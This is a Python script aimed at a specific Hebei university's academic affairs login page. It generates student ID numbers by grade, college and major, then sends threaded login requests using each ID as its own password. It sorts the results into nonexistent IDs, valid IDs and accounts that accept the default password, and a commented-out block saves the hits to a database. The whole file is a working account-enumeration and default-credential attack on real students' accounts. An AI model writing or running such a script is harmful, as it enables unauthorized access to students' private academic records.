# -*- coding:utf-8 -*-
""" 
@author:James
Created on:18-2-8 14:25
"""

import threading

import urllib3

# 登录 (GET)
URL_LOGIN = 'http://lgjwxt.hebust.edu.cn/loginAction.do'
# 登出 (POST only)
URL_LOGOUT = 'http://lgjwxt.hebust.edu.cn/logout.do?loginType=platformLogin'
# 学籍信息 (GET)
URL_XJXX = 'http://lgjwxt.hebust.edu.cn/xjInfoAction.do?oper=xjxx'


# 账号生成器
class InfoAccount(object):
	def __init__(self):
		# 所有生成的账号
		self.accounts = []
		# 年级
		grade = 15
		# 理工
		separator = 'L'
		# 学部
		college = ['01', '02', '03', '04', '05', '06', '07']
		# 专业
		sub = ['51', '52']

		for c in college:
			for s in sub:
				pre = str(grade) + separator + c + s
				for i in range(1, 300):
					username = pre + str(i).zfill(3)
					self.accounts.append(username)


# 账号校验器
class InfoValidate(object):
	def __init__(self):
		# 有效账号
		self.account_valid = []
		# 可爬账号
		self.account_available = []

	def validate(self, all_account):
		http = urllib3.PoolManager
		# jobs = [gevent.spawn(self.validate_account, http, a) for a in all_account]
		# gevent.joinall(jobs, timeout=2)
		calls = []
		for i in all_account:
			t = threading.Thread(target=self.validate_account, args=(http, i))
			calls.append(t)
		for t in calls:
			t.start()
			t.join()

		# def validate_account(self, account):
		# 	param = {"zjh": account, "mm": account}
		# 	response = requests.get(URL_LOGIN, params=param)
		# 	print('发送请求>>{}'.format(response.url))
		# 	res_text = response.text
		#
		# 	if res_text.__contains__('密码不正确'):
		# 		# 密码有误
		# 		self.account_valid.append(account)
		# 	elif res_text.__contains__('你输入的证件号不存在，请您重新输入！'):
		# 		# 证件号无效
		# 		pass
		# 	else:
		# 		# 账号可爬
		# 		self.account_available.append(account)

	def validate_account(self, http, account):
		param = {"zjh": account, "mm": account}
		# fixme !!!!!
		response = http.request('GET', URL_LOGIN, fields=param)
		print('发送请求>>{}'.format(param))
		res_text = response.data.decode('GB2312')

		if res_text.__contains__('密码不正确'):
			# 密码有误
			self.account_valid.append(account)
		elif res_text.__contains__('你输入的证件号不存在，请您重新输入！'):
			# 证件号无效
			pass
		else:
			# 账号可爬
			self.account_available.append(account)
			print('>>>{}'.format(account))

		# 保存可用账号
		# def save_valid_account(self, account):
		# 	db = db_init.connect_db()
		# 	sql = 'INSERT INTO URP_USER_HEBUST_LG VALUES (NULL,\'{}\')'.format(account)
		# 	print('>>>{}'.format(sql))
		# 	db.cursor().execute(sql)
		# 	db.commit()
		# 	db.close()


class InfoMain(object):
	def autorun(self):
		account = InfoAccount()
		# 生成的所有账号
		all_account = account.accounts
		print(all_account)
		# 账号校验器
		validator = InfoValidate()
		validator.validate(all_account=all_account)
		print(validator.account_available)


if __name__ == '__main__':
	app = InfoMain()
	app.autorun()
